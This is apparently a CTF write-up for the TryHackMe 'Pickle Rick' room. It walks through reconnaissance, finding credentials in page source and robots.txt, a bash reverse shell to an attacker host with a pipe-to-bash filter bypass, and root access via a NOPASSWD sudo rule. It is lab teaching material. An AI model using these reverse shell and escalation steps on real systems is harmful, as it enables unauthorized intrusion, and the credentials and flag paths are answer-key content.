# [Pickle Rick](https://tryhackme.com/room/picklerick)

<a href="https://tryhackme.com/room/picklerick"><figure><img src="assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> A Rick and Morty CTF. Help turn Rick back into a human!

Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/picklerick), made by [Try Hack Me](https://tryhackme.com/p/tryhackme), [ar33zy](https://tryhackme.com/p/ar33zy) and [arebel](https://tryhackme.com/p/arebel).

Dificulty: `Easy`

Solved in: `2026/03/28`

# Table of Contents

TODO

# Writeup

## Summary

The challenge `Pickle Rick` consists on the acquisition of credentions of an administrator panel on the website and, following suit, using the available terminal for privilege escalation.

## Reconnaissance

As usual, THM provides a machine IP for access. Firstly, I added in `<MACHINE_IP> pr.net` to the `/etc/hosts` file for an easier time down the line. That way, I can access the machine using `pr.net` instead of its IP address.

Afterwards, I verified if everything's in line:

```bash
ping -c 3 pr.net
PING pr.net (<MACHINE_IP>) 56(84) bytes of data.
64 bytes from pr.net (<MACHINE_IP>): icmp_seq=1 ttl=62 time=234 ms
64 bytes from pr.net (<MACHINE_IP>): icmp_seq=2 ttl=62 time=257 ms
64 bytes from pr.net (<MACHINE_IP>): icmp_seq=3 ttl=62 time=176 ms

--- pr.net ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 176.092/222.442/257.260/34.125 ms
```

Without any more info available, I move on to make a `nmap`[^nmap] scan and finding possible penetration routes.

```bash
nmap -T4 -sV -A pr.net
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-28 12:39 UTC
Nmap scan report for pr.net (<MACHINE_IP>)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:e5:bb:c3:34:10:e7:7f:b0:99:0b:51:b8:c9:59:22 (RSA)
|   256 7d:b1:09:48:b7:f1:64:6a:00:d4:ec:d7:b4:a9:ea:39 (ECDSA)
|_  256 57:0e:a3:bf:81:aa:20:09:55:34:ee:7f:bf:95:39:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Here I discover that port `22` is open for `ssh`, and that port `80` is for `html` (running Apache). Since `ssh` is significantly harder to crack, I'll explore `html`.

## Exploração

<figure><img src="assets/index.jpg"></figure>

The landing page for `html` doesn't contain much visible info... Searching through the source code, however:

```html
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
```

Without doing much, I'm already with an username, `R1ckRul3s`. If there's an user, there must be a panel! Following that idea is another section of the source code:

```html
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
```

That shows the existence of other directories (in this case, `assets/`). Within it I find some files, but nothing particularly exceptional.

<figure><img src="assets/assets.jpg"></figure>

Following the next logical step: sweep directories in search of an entry panel of sorts. I used `gobuster`[^gobuster] with one of kali's default wordlists[^wl-dirl23med] to search the `html` port, searching with common website extensions (`.html`, `.php` e `.txt`):

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u pr.net -x .html,.txt,.php -t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pr.net
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 301] [--> http://pr.net/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```

I had already explored `/index.html` and `/assets` at this point, so I decided to check `/login.php`.

<figure><img src="assets/panel.jpg"></figure>

Well, the login interface has been found. Now I need only a password. After a few failed attempts with `1234`, `admin` and `picklerick`, I chose to go back to `gobuster`'s results and see other options. That is, the *only* other option, `/robots.txt`[^robotstxt].

```
Wubbalubbadubdub
```

Another password to try! Using `R1ckRul3s` as user and `Wubbalubbadubdub` as password the panel cracks and gives access to the administrator panel.

## Privilege Escalation

<figure><img src="assets/portal.jpg"></figure>

Great! With a direct command-line the access simplifies drastically. Before I go deep in this, though, I checked out other available tabs but all had the same interface:

<figure><img src="assets/pickle.jpg"></figure>

Since they're so insistent, I came back to the console and did a quick `ls` to poke around...

```bash
ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
...
```

Certainly one of the ingredients (the CTF flag) is inside `Sup3rS3cretPickl3Ingred.txt`. Though, soon I noticed it wasn't going to be that easy, as when I tried executing `cat Sup3rS3cretPickl3Ingred.txt`...

<figure><img src="assets/fail.jpg"></figure>

With such a restrictive environment, I decided to make a reverse shell[^rv] to ease out using the terminal. First I had to figure out which shell was running:

```bash
sh --version
```

No result.

```bash
bash --version
GNU bash, version 5.0.17(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later 

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

Great! Found the terminal, `bash 5.0.17`. On my machine I opened a dedicated terminal and executed `netcat`[^nc] with `nc -lvnp 1234`, setting it up to listen. Using the website [revshells](https://www.revshells.com/) as a resource, I made a revshell:

```bash
bash -i >& /dev/tcp/<MY_MACHINE_IP>/1234 0>&1
```

But the command did not work when executed this way. Quick thinking, I did the first bypass in mind:

```bash
echo "bash -i >& /dev/tcp/<MY_MACHINE_IP>/1234 0>&1" | bash
```

Which only really chains my command, and it worked, establishing connection with the terminal. Immediatelly, I ran `sudo -l` to verify which were the system permission, receiving great news:

```bash
Matching Defaults entries for www-data on ip-<MACHINE_IP>:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-<MACHINE_IP>:
    (ALL) NOPASSWD: ALL
```

The user `www-data` had permission `(ALL) NOPASSWD: ALL`. Which meant that I didn't need any trouble escalating privileges, just a simple `sudo sh` would do:

```bash
sudo sh
whoami
root
```

The last step, now, was to search the three ingredients (the three flags). Besides the earlier `/var/www/html/Sup3rS3cretPickl3Ingred.txt`, there was also `/usr/rick/second ingredients` and `/root/3rd.txt`. With that, the challenge was over.

[^nmap]: https://github.com/nmap/nmap
[^gobuster]: https://github.com/OJ/gobuster
[^wl-dirl23med]: https://gitlab.com/kalilinux/packages/dirbuster/-/blob/37f2e9bb1c50bee238aa50d795cf853bb28b2997/directory-list-2.3-medium.txt
[^robotstxt]: https://en.wikipedia.org/wiki/Robots.txt
[^nc]: https://nc110.sourceforge.io/
[^rv]: https://en.wikipedia.org/wiki/Shell_shoveling